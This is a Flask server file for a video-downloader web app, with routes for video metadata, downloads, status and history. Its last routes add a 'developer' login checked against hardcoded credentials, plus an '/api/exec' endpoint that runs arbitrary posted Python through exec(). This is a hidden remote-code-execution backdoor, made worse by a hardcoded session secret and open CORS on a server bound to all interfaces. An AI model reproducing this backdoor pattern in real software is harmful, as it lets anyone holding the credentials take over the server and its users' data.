import os
import json
import threading
from flask import Flask, request, jsonify, send_from_directory, make_response, Response, abort, session
from flask_cors import CORS

from utils.downloader import get_video_info, start_download, cancel_download
from utils.status_manager import get_status
from utils.history_manager import load_history
from utils.cleanup import cleanup_old_videos

# ✅ Initialize Flask App
app = Flask(__name__)
CORS(app)  # Enable CORS for Flutter frontend
app.secret_key = 'supersecretkeychangeit'  # 🔐 Session secret key

# ✅ Directory setup
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
VIDEO_DIR = os.path.join(BASE_DIR, "static", "videos")
os.makedirs(VIDEO_DIR, exist_ok=True)

# ✅ Background cleanup thread
def start_background_tasks():
    threading.Thread(target=cleanup_old_videos, daemon=True).start()

start_background_tasks()

# ✅ Credentials (can be moved to env/config)
VALID_USERNAME = "forest_dev"
VALID_PASSWORD = "yts$4dm1n"

# ✅ Home route
@app.route('/')
def home():
    return send_from_directory("web/templates", "index.html")

# ✅ Serve downloaded videos
@app.route('/videos/<path:filename>')
def serve_video(filename):
    try:
        file_path = os.path.join(VIDEO_DIR, filename)
        if not os.path.isfile(file_path):
            return jsonify({'error': 'File not found'}), 404

        ext = os.path.splitext(filename)[1].lower()
        mime_type = {
            '.webm': 'video/webm',
            '.mkv': 'video/x-matroska',
            '.mov': 'video/quicktime'
        }.get(ext, 'video/mp4')

        response = make_response(send_from_directory(VIDEO_DIR, filename, mimetype=mime_type))
        response.headers.update({
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Content-Type': mime_type,
            'Content-Disposition': f'attachment; filename="{filename}"'
        })
        return response
    except Exception as e:
        return jsonify({'error': f'Failed to serve video: {str(e)}'}), 500

# ✅ Metadata extraction (normal)
@app.route('/fetch_info', methods=['POST'])
def fetch_info():
    try:
        data = request.get_json(force=True)
        url = data.get('url', '').strip()
        if not url:
            abort(400, "URL is required.")
        print(f"[INFO] Fetching metadata for: {url}")

        video_info = get_video_info(url)
        return Response(json.dumps(video_info), content_type='application/json')
    except Exception as e:
        return jsonify({'error': f'Exception during fetch: {str(e)}'}), 500

# ✅ In-App Browser (WebView) extraction (NOW DEFAULTED TO COOKIE FILE ONLY)
@app.route('/extract', methods=['POST'])
def extract_from_webview():
    try:
        data = request.get_json(force=True)
        url = data.get('url', '').strip()
        if not url:
            return jsonify({'error': 'URL is required'}), 400
        print(f"[EXTRACT] Extracting from WebView: {url}")

        return jsonify(get_video_info(url))
    except Exception as e:
        return jsonify({'error': f'Failed to extract info: {str(e)}'}), 500

# ✅ Start download
@app.route('/download', methods=['POST'])
def download():
    try:
        data = request.get_json(force=True)
        url = data.get('url', '').strip()
        quality = data.get('quality', '').strip()
        if not url or not quality:
            return jsonify({'error': 'Missing URL or quality'}), 400

        print(f"[DOWNLOAD] Starting for: {url}")

        download_id = start_download(url, quality)
        return jsonify({'download_id': download_id, 'status': 'started'})
    except Exception as e:
        return jsonify({'error': f'Failed to start download: {str(e)}'}), 500

# ✅ Cancel download
@app.route('/cancel/<download_id>', methods=['POST'])
def cancel(download_id):
    try:
        success = cancel_download(download_id)
        if success:
            return jsonify({'status': 'cancelled'})
        return jsonify({'error': 'Invalid download ID or already finished'}), 400
    except Exception as e:
        return jsonify({'error': f'Failed to cancel: {str(e)}'}), 500

# ✅ Check download status
@app.route('/status/<download_id>')
def status(download_id):
    try:
        data = get_status(download_id)
        if not data:
            return jsonify({'error': 'Invalid download ID'}), 404
        return jsonify(data)
    except Exception as e:
        return jsonify({'error': f'Status check failed: {str(e)}'}), 500

# ✅ View download history
@app.route('/history')
def history():
    try:
        return jsonify(load_history())
    except Exception as e:
        return jsonify({'error': f'Failed to load history: {str(e)}'}), 500

# ✅ Developer login (hidden credentials)
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    if username == VALID_USERNAME and password == VALID_PASSWORD:
        session['authenticated'] = True
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Invalid credentials'}), 401

# ✅ Built-in terminal for developers
@app.route('/api/exec', methods=['POST'])
def exec_code():
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 403

    try:
        data = request.get_json()
        code = data.get('code', '')
        local_vars = {}
        exec(code, {}, local_vars)
        return jsonify({'output': local_vars})
    except Exception as e:
        return jsonify({'error': str(e)})

# ✅ Block unwanted routes
@app.route('/favicon.ico')
@app.route('/ads.txt')
@app.route('/robots.txt')
def dummy_block():
    return '', 204

# ✅ Run app in debug (optional)
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
